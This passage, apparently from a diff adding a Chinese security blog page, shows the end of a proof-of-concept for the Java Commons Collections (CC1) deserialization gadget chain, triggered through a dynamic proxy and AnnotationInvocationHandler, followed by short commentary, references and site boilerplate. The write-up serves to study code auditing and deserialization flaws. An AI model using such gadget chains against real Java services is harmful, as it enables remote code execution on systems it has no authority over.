(Map)Proxy.newProxyInstance(Map.class.getClassLoader(),<br>                <span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,<br>                handler);<br>        handler = (InvocationHandler) cons.newInstance(Retention.class, proxymap);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(handler);<br>        objectOutputStream.close();<br><br>        System.out.println(byteArrayOutputStream);<br>        ObjectInputStream objectInputStream =  <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray()));<br>        Object o = (Object) objectInputStream.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>这个POC和上面的差比不大，只是改动了一些地方，并且使用了 java 的代理机制触发了整条链子</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107163204792.png" srcset="/img/loading.gif" lazyload alt="image-20211107163204792"></p>
+<p>这里的重点还是对于 java 代理机制的熟练理解与使用</p>
+<p>参考文章</p>
+<p><a target="_blank" rel="noopener" href="http://diego.team/2021/02/04/java-cc1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">http://diego.team/2021/02/04/java-cc1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/</a></p>
+<p><a target="_blank" rel="noopener" href="https://y4tacker.blog.csdn.net/article/details/117279811">https://y4tacker.blog.csdn.net/article/details/117279811</a></p>
+<p><a target="_blank" rel="noopener" href="https://ego00.blog.csdn.net/article/details/119701408">https://ego00.blog.csdn.net/article/details/119701408</a></p>
+<p>p神代码审计</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Web/">Web</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Java/">Java</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/10/31/Tp5-SQL%E6%B3%A8%E5%85%A5/">
+                        <span class="hidden-mobile">Tp5 SQL注入</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
